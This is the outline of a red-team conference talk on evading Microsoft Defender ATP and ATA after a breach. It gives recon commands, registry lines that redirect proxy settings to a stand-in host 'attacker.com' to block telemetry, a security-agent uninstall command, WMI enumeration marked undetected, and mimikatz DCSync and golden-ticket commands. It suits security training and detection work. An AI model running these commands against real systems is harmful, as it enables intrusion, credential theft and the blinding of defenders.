# Microsoft Just Gave the Blue Team Tactical Nukes (And How Red Teams Need to Adapt)

## Speaker Introduction
- **Role**: Red Team Operations Lead at IBM X-Force Red
- **Experience**: Conducts red teaming operations against defense contractors and some of North America’s largest banks.
- **Affiliations**: Board member for CREST USA (crest-approved.org).
- **Teaching**: Network and mobile penetration testing.
- **Interests**: Mountain biking, drones, and beer.
- **Personal Note**: First-time speaker, please be gentle.
- **Nationality**: Canadian, unapologetically.

## Lab Background
- **Environment**: 3 domains within a 2012R2 Forest and a 2016 Forest, connected via a two-way forest trust.
- **Users**: Approximately 3,000 users.
- **ATP Configuration**: ATP RS2 running on 10 Windows 10 1703 boxes with all default and preview features enabled.
- **Servers**: 10 2012R2/2016 member servers running SQL 2012, etc.
- **ATA**: Both forests have an ATA 1.8 Lightweight Gateway, upgraded from 1.7 in early July.

## Tactical Nukes?
- **Red Team vs. Blue Team**: The context of the discussion is post-breach scenarios.
- **Source**: [Disrupting the Kill Chain](https://blogs.microsoft.com/microsoftsecure/2016/11/28/disrupting-the-kill-chain/)

## ATP's Cloud-Based Management Dashboard
- **Overview**: Introduction to the dashboard.
- **Alert Process Tree**: Visual representation of alerts.
- **Incident Graphs**: Graphical depiction of incidents.
- **Host Management**: Tools and features for managing hosts.

## Upcoming Windows 10 Fall Creators Update with ATP Release 3
- **Defender Brand Expansion**:
  - **Windows Defender AV**
  - **Windows Defender Advanced Threat Protection**
  - **Windows Defender Exploit Guard (EMET)**
  - **Windows Defender Application Guard**
  - **Windows Defender Device Guard**
  - **Credential Guard**
- **Platform Coverage**: Extended to cover the Windows Server platform, starting with Windows Server 2012 R2 and 2016, and Linux.
- **Source**: [Announcing End-to-End Security Features in Windows 10](https://blogs.windows.com/business/2017/06/27/announcing-end-end-security-features-windows-10/)

## Gaining a Foothold with Out-of-the-Box Payloads
- **Obfuscated Payloads**: Techniques for obfuscating payloads.
- **PowerShell v5 Security**: 
  - "Suspicious Strings" are flagged by default.
  - Script Block Logging is enabled by default.
  - AMSI is also enabled by default.
  - Downgrading to PSv2 or using NotPowerShell does not bypass these protections.
  - Common techniques leveraging WScript.Shell, etc., are also caught.
- **Undetected Techniques**:
  - Bypassing Script Block Logging/AMSI and executing encoded payloads.
  - Using VBA shellcode injection without Kernel32 API declarations (e.g., cactustorch).
  - Sneakier executables with Shelter, diagcabs, etc.
  - **Sources**:
    - [Payload Generation with Cactustorch](https://www.mdsec.co.uk/2017/07/payload-generation-with-cactustorch/)
    - [ScriptBlock Warning Event Logging Bypass](https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.html)
    - [WinPayloads GitHub Repository](https://github.com/nccgroup/winpayloads)

## Post-Breach Activities
- **Challenge**: Detection of activities and commands after gaining an initial foothold.
- **Activities**:
  - Host Reconnaissance
  - Host Privilege Escalation
  - Internal Domain Reconnaissance
  - Internal Network Reconnaissance
  - Credential Theft
  - Lateral Movement
  - NTDS.Dit Extraction

### Host Reconnaissance
- **Commands**:
  ```cmd
  echo %userdomain%
  echo %logonserver%
  echo %homepath%
  echo %homedrive%
  net view
  net view \fileserv /all
  net share
  net accounts
  netstat
  tasklist /svc
  gpresult /z
  net localgroup Administrators
  netsh advfirewall show allprofiles state
  systeminfo
  netstat –anfo
  wmic process list brief
  wmic group list brief
  wmic computersystem list
  wmic process list /format:list
  wmic ntdomain list /format:list
  wmic useraccount list /format:list
  wmic group list /format:list
  wmic sysaccount list /format:list
  $env:USERDOMAIN
  $env:LOGONSERVER
  $env:HOMEPATH
  $env:HOMEDRIVE
  $env:SYSTEMDRIVE
  $env:TEMP
  $env:ComSpec
  $env:USERNAME
  Tree $home
  ```

## Traditional Defender AV
- **Note**: Defender AV runs as Local System.
- **Patch Timing**: By the time you read this, the target’s Defender AV instances were already patched.

## Elevating Privileges
- **Requirement**: Must elevate to system to stop ATP processes, modify binaries, etc.

## Uninstalling ATP
- **Comparison**: Unlike other cloud AV products like CrowdStrike, ATP requires a generated offboarding script with a SHA256 signed registry key based on the unique Org ID and certificate.
- **Command Example**:
  ```cmd
  wmic product where "description='CrowdStrike Sensor Platform’” uninstall
  ```

## Telemetry (Cloud Communications)
- **API Usage**: The ATP sensor uses Windows Telemetry (DiagTrack service), which communicates with the Windows Defender ATP cloud service via WinHTTP Services (winhttp.dll.mui).

## Disrupting ATP Communications as an Unprivileged User
- **WinHTTP API**: Independent of Windows Internet (WinINet) proxy settings but follows statically set proxy settings within HKCU.
- **Manual Configuration**:
  ```cmd
  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" ^ /v AutoDetect /t REG_DWORD /D 0 /f
  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL /t REG_SZ /d "http://attacker.com/wpad.dat" /f
  ```
- **Note**: This only blocks ATP (Sense), not Windows Defender AV, as AV doesn’t use WinHTTP.

## Blocking ATP Communications via Firewall
- **Technique**: Can be used to block traffic for Event Log Forwarding, Sysmon, SCOM, etc.

## Why Block Instead of Disabling?
- **Advantages**:
  - Quick to implement.
  - Does not require escalating to system.
  - No communication error alert in Security Centre/cloud ATP console for 7 days.
  - Initial incident response shows the service/process still running.
  - Issue is not unique to ATP.

## ATA (Advanced Threat Analytics)
- **Components**:
  - **ATA Center**
  - **ATA Gateway**
  - **ATA Lightweight Gateway**
- **Required Windows Events**: 4776, 4732, 4733, 4728, 4729, 4756, 4757
- **Integration**: Can integrate with SIEM (syslog) & VPN (Radius).

## Learning Period
- **One Month**:
  - Abnormal behavior
  - Abnormal sensitive group modification
  - Recon using directory services
- **One Week**:
  - Encryption downgrades (skeleton key, golden ticket, over pass the hash)
  - Brute force

## Detected Activities
- **Internal Recon**:
  - AD recon via typical queries like `net user /domain`
  - DNS queries and zone transfers
  - User session enumeration via PowerView, NetSess, etc.

## Not Detected Activities
- **Enumeration via WMI Local Name Space**:
  - **Domain User Accounts**:
    ```powershell
    Get-WmiObject -Class Win32_UserAccount -Filter "Domain='dev' AND Disabled='False'" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired, PasswordChangeable, Description, SID
    ```
  - **Domain Groups**:
    ```powershell
    Get-WmiObject -Class Win32_GroupInDomain | Select PartComponent | Select-String -Pattern "Microsoft Advanced Threat Analytics"
    Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name like '%SQL%'"
    Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name like '%Admin%'"
    ```
  - **Domain Group User Memberships**:
    ```powershell
    Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name='Enterprise Admins'" | Get-CimAssociatedInstance -Association Win32_GroupUser
    Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name='DNSAdmins'" | Get-CimAssociatedInstance -Association Win32_GroupUser
    Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name='Microsoft Advanced Threat Analytics Administrator'" | Get-CimAssociatedInstance -Association Win32_GroupUser
    ```

## Examples and Demos
- **Forest Trusts Demo**
- **Lateral Movement via SQL Demo**

## DCSync Detection
- **mimikatz Command**:
  ```plaintext
  mimikatz # lsadump::dcsync /domain prod.local /user:krbtgt
  ```

## Copying NTDS.dit File Remotely Using WMI
- **Technique**: Using the WMI Win32_ShadowCopy Class to dump the ntds.dit via volume shadow copies without calling vssadmin.exe.
- **Detection**: Not detected by ATP, but flagged as a LOW severity event in ATA.

## Golden Tickets Detection
- **Using KRBTGT NTLM Hash**:
  ```plaintext
  kerberos::golden /user:EdwardAbbey /domain:prod.local /sid:S-1-5-21-2184559304-2325842030-2845129662-500 /krbtgt:43f53b1c3516a08b2c33ded83bff0c9f /groups:513,512,520,518,519 /ptt
  ```
- **Not Detected**: Using AES Key
  ```plaintext
  kerberos::golden /user:JohnVanwagoner /domain:prod.local /sid:S-1-5-21-2184559304-2325842030-2845129662 /aes256:05df6ed1616d67dc672d51814959b9b6de0d9f5f89c53d186eff3cea13bae2e9 /groups:512,513 /startoffset:-1 /endin:500 /renewmax:3000 /ptt
  ```

## Big Thanks and Sources
- **Contributors**:
  - @angus_tx, @nosteve, and the rest of the IBM X-Force Red crew
  - @0xbadjuju, @_nullbind, NetSPI for PowerUp SQL and WMI techniques
  - @mattifestation and the rest of the ATP/ATA crew at MS
  - @cobbr_io, @danielhbohannon, @nikhil_mitt, @kevin_Robertson, @gentilkiwi, @armitagehacker, @harmj0y, @JershMagersh, @vysecurity, and many others for tools, techniques, and contributions to the community.